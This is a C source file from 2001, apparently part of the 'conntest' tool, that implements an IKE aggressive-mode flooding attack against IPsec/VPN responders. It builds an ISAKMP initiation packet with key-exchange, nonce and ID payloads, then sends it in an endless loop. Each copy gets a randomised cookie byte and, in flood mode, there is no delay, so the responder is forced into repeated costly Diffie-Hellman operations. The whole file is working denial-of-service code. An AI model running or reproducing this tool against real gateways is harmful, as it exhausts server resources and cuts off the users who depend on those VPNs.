/*

  ike.c 

  Copyright (c) 2001 Pekka Riikonen, priikone@silcnet.org.

  This program is free software; you can redistribute it and/or modify
  it under the terms of the GNU General Public License as published by
  the Free Software Foundation; either version 2 of the License, or
  (at your option) any later version.
 
  This program is distributed in the hope that it will be useful,
  but WITHOUT ANY WARRANTY; without even the implied warranty of
  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
  GNU General Public License for more details.

*/
/* This will perform IKE round trips as initiator until it is assured
   that the responder has performed or is to perform heavy Diffie-Hellman
   operation. */

#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <sys/types.h>
#include <string.h>
#include <assert.h>
#ifdef WIN32
#define usleep(x) (Sleep(x / 1000))
#define sleep(x) (Sleep(x * 1000))
#include <windows.h>
#include <winsock.h>
#else
#include <unistd.h>
#include <netdb.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <time.h>
#endif
/* ISAKMP payload params */

/* IKE version used */
unsigned char version = 0x10;

/* Idnetity Protection mode is Aggressive */
unsigned char a_mode = 0x04;
unsigned char m_mode = 0x02;

/* Flags used */
unsigned char flags = 0;

/* Message ID used */
unsigned char message_id[4] = { 0x00, 0x00, 0x00, 0x00 };


/* SA payload params */

/* DOI used (IPSEC) */
unsigned char doi[4] = { 0x00, 0x00, 0x00, 0x01 };

/* Situation used */
unsigned char sit[4] = { 0x00, 0x00, 0x00, 0x01 };


/* Proposal payload params */

/* Protocol ID to be used (ISAKMP) */
unsigned char protocol_id = 0x00;

/* SPI size */
unsigned char spi_size = 0x08;

/* Number of transforms (only 1 supported) */
unsigned char n_tranforms = 0x01;


/* Transform payload params */

/* Transform ID (KEY_IKE) */
unsigned char transform_id = 0x01;

/* Encryption (3DES) */
unsigned char enc[4] = { 0x80, 0x01, 0x00, 0x05 };

/* Hash (SHA1) */
unsigned char hash[4] = { 0x80, 0x02, 0x00, 0x02 };

/* Auth method (PSK) */
unsigned char auth[4] = { 0x80, 0x03, 0x00, 0x01 };

/* IKE Groups (2 == 1024) */
unsigned char grp[4] = { 0x80, 0x04, 0x00, 0x02 };

/* Life type and life (seconds and 3600) */
unsigned char life_type[4] = { 0x80, 0x0b, 0x00, 0x01 };
unsigned char life[4] = { 0x80, 0x0c, 0x0e, 0x10 };

/* Payload lengths */
int isakmp_len = 28;
int sa_len = 12;
int proposal_len = 16;
int transform_len = 32;
int ke_len = 132;
int nonce_len = 20;
int id_len = 12;

/* Default params */
#define IKE_PORT 500

typedef struct IkeStruct *Ike;
typedef struct NegotiationStruct *Negotiation;

/* IKE Negotiation */
struct NegotiationStruct {
  Ike ike;
  unsigned char icookie[8];
  unsigned char rcookie[8];
  unsigned char *s1_packet;
  unsigned char *s2_packet;
  int dest_sock;
  struct sockaddr_in dest;
  int flood;
  char *identity;
  int group;
  int auth;
};

/* IKE server context */
struct IkeStruct {
  int listener;
  Negotiation *neg;
  unsigned int num_neg;
  unsigned char data[256];
};

#define PUT_32(cp, value) do {						\
  ((unsigned char *)(cp))[0] = (unsigned char)((value) >> 24);		\
  ((unsigned char *)(cp))[1] = (unsigned char)((value) >> 16);		\
  ((unsigned char *)(cp))[2] = (unsigned char)((value) >> 8);		\
  ((unsigned char *)(cp))[3] = (unsigned char)(value); } while (0)

#define PUT_16(cp, value) do {						\
  ((unsigned char *)(cp))[0] = (unsigned char)((value) >> 8);		\
  ((unsigned char *)(cp))[1] = (unsigned char)(value); } while (0)

/* Send data */

static int ike_send(Negotiation neg, unsigned char *data,
			     unsigned int data_len)
{
  int len = sizeof(struct sockaddr_in);
  return sendto(neg->ike->listener, data, data_len, 0, 
		(struct sockaddr *)&neg->dest, len);
}

#if 0
/* Receive data (blocks) */

static int ike_recv(Negotiation neg, unsigned char *data,
			     unsigned int data_len)
{
  int len = sizeof(neg->dest);
  return recvfrom(neg->ike->listener, data, data_len, 0, 
		  (struct sockaddr *)&neg->dest, &len);
}
#endif

/* Send our intiation (first packet) to the responder */

static void ike_send_s1(Negotiation neg)
{
  unsigned int data_len, len = 0;
  unsigned char *cp;
  int i;
  unsigned long ident;

  /* Construct our first packet */

  data_len = (isakmp_len + sa_len + proposal_len + transform_len + 
	      ke_len + nonce_len + id_len);
  cp = neg->s1_packet = calloc(data_len, sizeof(*neg->s1_packet));

  /* ISAKMP header */
  memcpy(cp + len, neg->icookie, sizeof(neg->icookie));
  len += sizeof(neg->icookie);
  memcpy(cp + len, neg->rcookie, sizeof(neg->rcookie));
  len += sizeof(neg->rcookie);
  cp[len++] = 0x01;		      /* SA */
  cp[len++] = version;		      /* Version */
  cp[len++] = a_mode;		      /* Aggressive mode */
  cp[len++] = flags;		      /* Flags */
  memcpy(cp + len, message_id, sizeof(message_id)); /* Message id */
  len += sizeof(message_id);
  PUT_32(cp + len, data_len);	      /* length */
  len += 4;

  /* SA Payload */
  cp[len++] = 0x04;		      /* KE */
  len++;			      /* RESERVED */
  PUT_16(cp + len, (sa_len + proposal_len + transform_len));
  len += 2;
  memcpy(cp + len, doi, sizeof(doi)); /* DOI */
  len += sizeof(doi);
  memcpy(cp + len, sit, sizeof(sit)); /* SIT */
  len += sizeof(sit);

  /* Proposal payload */
  cp[len++] = 0x00;		      /* NONE */
  len++;			      /* RESERVED */
  PUT_16(cp + len, (proposal_len + transform_len));
  len += 2;
  cp[len++] = 0x00;		      /* Proposal number */
  cp[len++] = 0x01;		      /* Protocol ID */
  cp[len++] = 0x08;		      /* SPI size */
  cp[len++] = n_tranforms;     	      /* Number of transforms */
  memcpy(cp + len, neg->icookie, sizeof(neg->icookie));	/* SPI */
  len += sizeof(neg->icookie);

  /* Transform payload */
  cp[len++] = 0x00;		      /* NONE */
  len++;			      /* RESERVED */
  PUT_16(cp + len, transform_len);    /* Length */
  len += 2;
  cp[len++] = 0x00;		      /* Transform number */
  cp[len++] = transform_id;	      /* Transform ID */
  len += 2;			      /* RESERVED */
  memcpy(cp + len, enc, sizeof(enc)); /* ENC */
  len += sizeof(enc);
  memcpy(cp + len, hash, sizeof(hash));	/* Hash */
  len += sizeof(hash);
  memcpy(cp + len, auth, sizeof(auth));	/* Auth method */
  len += sizeof(auth);
  if (neg->auth)
    cp[len - 1] = neg->auth;
  memcpy(cp + len, grp, sizeof(grp)); /* Group */
  len += sizeof(grp);
  if (neg->group)
    cp[len - 1] = neg->group;
  memcpy(cp + len, life_type, sizeof(life_type)); /* Life type */
  len += sizeof(life_type);
  memcpy(cp + len, life, sizeof(life));	/* Life */
  len += sizeof(life);

  /* Payloads for aggressive mode */

  /* KE payload */
  cp[len++] = 0x0a;		      /* Nonce */
  len++;			      /* RESERVED */
  PUT_16(cp + len, ke_len);
  len += 2;
  memcpy(cp + len, neg->ike->data, 128);
  len += 128;
  
  /* Nonce payload */
  cp[len++] = 0x05;		      /* ID */
  len++;			      /* RESERVED */
  PUT_16(cp + len, nonce_len);
  len += 2;
  memcpy(cp + len, neg->ike->data, 16);
  len += 16;
  
  /* ID Payload */
  cp[len++] = 0x00;		      /* NONE */
  len++;			      /* RESERVED */
  PUT_16(cp + len, id_len);
  len += 2;
  cp[len++] = 0x01;		      /* Address type: IPv4 */
  cp[len++] = 17;		      /* Protocol ID: UDP*/
  PUT_16(cp + len, 500);	      /* Port: IKE 500 */
  len += 2;
  
  ident = inet_addr(neg->identity);
  memcpy(cp + len, (unsigned char *)&ident, 4);
  len += 4;

  /* Attack */
  fprintf(stderr, "Using %s as aggressive mode identity\n", neg->identity);
  fprintf(stdout, "Press Ctrl+C to break\n");
  fprintf(stderr, "Sending IKE attack n:o ");
  i = 0;
  while(1) {
    neg->s1_packet[7] = i + rand();
    ike_send(neg, neg->s1_packet, data_len);
    fprintf(stderr, "%10d\b\b\b\b\b\b\b\b\b\b", i + 1);
    i++;
    if (!neg->flood)
      sleep(1);
  }

  fprintf(stdout, "Done.\n");
  exit(1);
}

/* Starts IKE server and returns a context to the server. */

void *ike_start(void)
{
  Ike ike;
  struct sockaddr_in local;
  int port = IKE_PORT;
  int i, k;

  ike = calloc(1, sizeof(*ike));

  /* Create UDP listener */
  ike->listener = socket(AF_INET, SOCK_DGRAM, 0);
  if (ike->listener < 0) {
    perror("socket");
    fprintf(stderr, "conntest: could not create IKE listener\n");
    exit(1);
  }

  /* Bind to address and port */
  memset(&local, 0, sizeof(local));
  local.sin_family = AF_INET;
  local.sin_port = htons((unsigned short)port);
  if (bind(ike->listener, (struct sockaddr *)&local, sizeof(local)) < 0) {
    perror("bind");
    fprintf(stderr, "conntest: could not create IKE listener\n");
    close(ike->listener);
    exit(1);
  }

  fprintf(stdout, "IKE server created on port %d\n", port);

  /* Generate data */
  for (i = 0, k = 0; i < 256; i++, k++) {
    if (k > 255)
      k = 0;
    ike->data[i] = k;
  }

  return (void *)ike;
}

/* Adds new IKE negotiation to the IKE server and starts the negotiation.
   Each negotiation is run in own process. Each negotiation will end on
   its own after negotiation is finished. */

void ike_add(void *context, int sock, struct sockaddr_in *dest,
	     int flood, char *identity, int group, int auth)
{
  Ike ike = (Ike)context;
  Negotiation neg;
  int i;

  assert(ike);

  ike->neg = realloc(ike->neg, sizeof(*ike->neg) * (ike->num_neg + 1));

  neg = calloc(1, sizeof(*neg));
  neg->ike = ike;
  neg->dest_sock = sock;
  neg->flood = flood;
  neg->identity = identity ? strdup(identity) : strdup("0.0.0.0");
  neg->group = group;
  neg->auth = auth;
  memcpy(&neg->dest, dest, sizeof(*dest));

  ike->neg[ike->num_neg] = neg;
  ike->num_neg++;

#if 0
  /* Fork negotiation process */
  if (fork())
    return;
#endif

  fprintf(stdout, "Initiating IKE negotiation\n");

  /* Create initiator cookie. We will send a bogus cookie, and use zero
     cookie as responder cookie. This should make the responder to know
     that this is our first negotiation packet. We will later assure that
     we'll use correct responder cookie in the packets. */
  srand(time(NULL));
  for (i = 0; i < 8; i++)
    neg->icookie[i] = 1 + (int) (255.0 * rand() / (RAND_MAX + 1.0));

  /* Start IKE negotiation */
  ike_send_s1(neg);
}
